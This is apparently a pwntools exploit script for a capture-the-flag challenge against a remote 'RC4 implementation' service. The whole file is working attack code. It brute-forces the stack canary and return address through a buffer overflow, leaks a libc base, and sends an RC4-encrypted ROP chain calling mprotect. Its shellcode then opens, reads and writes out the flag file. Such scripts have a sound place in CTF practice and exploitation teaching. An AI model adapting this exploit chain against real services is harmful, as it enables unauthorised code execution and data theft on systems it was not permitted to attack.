from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

#TARGET = './fillme'
HOST = '172.17.0.2'
PORT = 1337
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT =  1401

#elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		#print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

#canary = b'\xa7x\xea%\x9c,\x84I'
canary = b''
while(len(canary) < 8):
	for i in range(0x100):
		if i == 0xa or i == 0:
			continue
		r = start()

		r.sendlineafter(b'RC4 implementation\n', b'2')
		r.sendafter(b':\n', b'\x01'*0x10)
		payload = b''
		payload += b'a'*0x108
		payload += canary + i.to_bytes(1, 'little')
		r.sendafter(b':\n', payload)
		try:
			r.recvuntil(b'Output:\n')
			r.close()
			break
		except:
			r.close()
	canary +=  i.to_bytes(1, 'little')
	print(f"canary: {canary}")
#ret_addr = b'\xbf\xc7\x0b\x073\xfe\xd9g'
ret_addr = b''
while(len(ret_addr) < 8):
	for i in range(0x100):
		if i == 0xa or i == 0:
			continue
		r = start()

		r.sendlineafter(b'RC4 implementation\n', b'2')
		r.sendafter(b':\n', b'\x01'*0x10)
		payload = b''
		payload += b'a'*0x108
		payload += canary
		payload += b'b'*0x18
		payload += ret_addr + i.to_bytes(1, 'little')
		r.sendafter(b':\n', payload)
		try:
			r.recvuntil(b'Output:\n')
			r.close()
			break
		except:
			r.close()
	ret_addr +=  i.to_bytes(1, 'little')
	print(f"ret_addr: {ret_addr}")

context.log_level = 'debug'
r = start()
r.sendlineafter(b'RC4 implementation\n', b'2')
r.sendafter(b':\n', b'\x01'*0x10)
payload = b''
payload += b'a'*0x108
payload += canary
payload += b'b'*0x18
payload += ret_addr
r.sendafter(b'Data:\n', payload)
r.recv(8)
leak = r.recv(0x130)
leak = u64(leak[0x128:0x130])
base = leak + 0x3ff886
#base = leak + 0x3ff89e
dbg('leak')
dbg('base')
r.close()

system = base + 0x50d60
binsh = base + 0x1d8698
rdi = base + 0x001bc021
rsi = base + 0x001bb317
rdx_p1 = base + 0x00175548
rax = base + 0x001284f0
mprotect = base + 0x11ec50
syscall = base + 0x00140ffb
pt = b'a'*0x128+flat(rdi, base, rsi, 0x1000, rdx_p1, 7, 0xbeef, mprotect, rdi, 4, rsi, base, rdx_p1, 0x200, 0xbeef, rax, 0, syscall, base)
from Crypto.Cipher import ARC4
cipher = ARC4.new(b'\x01'*0x10)
dec = cipher.decrypt(pt)
rop_dec = dec[0x128:]

r = start()
r.sendlineafter(b'RC4 implementation\n', b'2')
r.sendafter(b':\n', b'\x01'*0x10)
payload = b''
payload += b'a'*0x108
payload += canary
payload += b'b'*0x18
payload += rop_dec

r.sendlineafter(b'Data:\n', payload)
flag = b'/home/encryptor/flag.txt\x00'
payload = asm('''
	mov rax, 0
	mov rdi, 4
	push rsp
	pop rsi
	mov rdx, {}
	syscall
	
	mov rax, 2
	push rsp
	pop rdi
	xor esi, esi
	xor edx, edx
	syscall

	mov rdi, rax
	mov rax, 0
	push rsp
	pop rsi
	mov rdx, 0x100
	syscall

	mov rax, 1
	mov rdi, 4
	push rsp
	pop rsi
	mov rdx, 0x100
	syscall
	hlt
	
'''.format(len(flag)))
r.send(payload.ljust(0x200, b'\x00'))
r.send(flag)
r.interactive()
r.close()
